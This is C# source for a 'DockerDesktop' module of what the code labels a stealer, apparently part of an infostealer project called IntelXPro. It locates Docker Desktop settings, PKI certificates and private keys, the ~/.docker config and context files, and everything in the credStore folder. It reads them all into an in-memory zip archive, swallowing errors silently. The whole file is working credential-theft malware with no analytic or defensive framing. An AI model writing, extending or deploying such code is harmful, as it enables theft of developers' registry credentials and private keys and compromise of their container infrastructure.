using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class DockerDesktop : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Docker");
            string userProfilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".docker");

            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "DockerDesktop";

            bool foundData = false;

            if (Directory.Exists(appDataPath))
            {
                foundData |= CollectFromAppData(appDataPath, zip, counterApplications);
            }

            if (Directory.Exists(userProfilePath))
            {
                foundData |= CollectFromUserProfile(userProfilePath, zip, counterApplications);
            }

            if (foundData && counterApplications.Files.Count > 0)
            {
                counter.Applications.Add(counterApplications);
            }
        }

        private bool CollectFromAppData(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "settings.json",
                    "pki\\*.crt",
                    "pki\\*.key"
                };

                foreach (string configPattern in configFiles)
                {
                    string fullPattern = Path.Combine(basePath, configPattern);
                    
                    if (configPattern.Contains("*"))
                    {
                        string directory = Path.GetDirectoryName(fullPattern);
                        string searchPattern = Path.GetFileName(fullPattern);
                        
                        if (Directory.Exists(directory))
                        {
                            string[] files = Directory.GetFiles(directory, searchPattern, SearchOption.TopDirectoryOnly);
                            foreach (string file in files)
                            {
                                string relativePath = file.Substring(basePath.Length + 1);
                                string zipPath = "Applications\\DockerDesktop\\AppData\\" + relativePath;
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                    else
                    {
                        if (File.Exists(fullPattern))
                        {
                            string relativePath = configPattern;
                            string zipPath = "Applications\\DockerDesktop\\AppData\\" + relativePath;
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPattern));
                            counterApplications.Files.Add(fullPattern + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }

        private bool CollectFromUserProfile(string basePath, InMemoryZip zip, Counter.CounterApplications counterApplications)
        {
            bool foundData = false;

            try
            {
                string[] configFiles = new string[]
                {
                    "config.json",
                    "contexts\\*.json"
                };

                foreach (string configPattern in configFiles)
                {
                    string fullPattern = Path.Combine(basePath, configPattern);
                    
                    if (configPattern.Contains("*"))
                    {
                        string directory = Path.GetDirectoryName(fullPattern);
                        string searchPattern = Path.GetFileName(fullPattern);
                        
                        if (Directory.Exists(directory))
                        {
                            string[] files = Directory.GetFiles(directory, searchPattern, SearchOption.AllDirectories);
                            foreach (string file in files)
                            {
                                string relativePath = file.Substring(basePath.Length + 1);
                                string zipPath = "Applications\\DockerDesktop\\.docker\\" + relativePath;
                                zip.AddFile(zipPath, File.ReadAllBytes(file));
                                counterApplications.Files.Add(file + " => " + zipPath);
                                foundData = true;
                            }
                        }
                    }
                    else
                    {
                        if (File.Exists(fullPattern))
                        {
                            string relativePath = configPattern;
                            string zipPath = "Applications\\DockerDesktop\\.docker\\" + relativePath;
                            zip.AddFile(zipPath, File.ReadAllBytes(fullPattern));
                            counterApplications.Files.Add(fullPattern + " => " + zipPath);
                            foundData = true;
                        }
                    }
                }

                string credStorePath = Path.Combine(basePath, "credStore");
                if (Directory.Exists(credStorePath))
                {
                    string[] credFiles = Directory.GetFiles(credStorePath, "*.*", SearchOption.AllDirectories);
                    foreach (string file in credFiles)
                    {
                        string relativePath = file.Substring(basePath.Length + 1);
                        string zipPath = "Applications\\DockerDesktop\\.docker\\" + relativePath;
                        zip.AddFile(zipPath, File.ReadAllBytes(file));
                        counterApplications.Files.Add(file + " => " + zipPath);
                        foundData = true;
                    }
                }
            }
            catch
            {
            }

            return foundData;
        }
    }
}
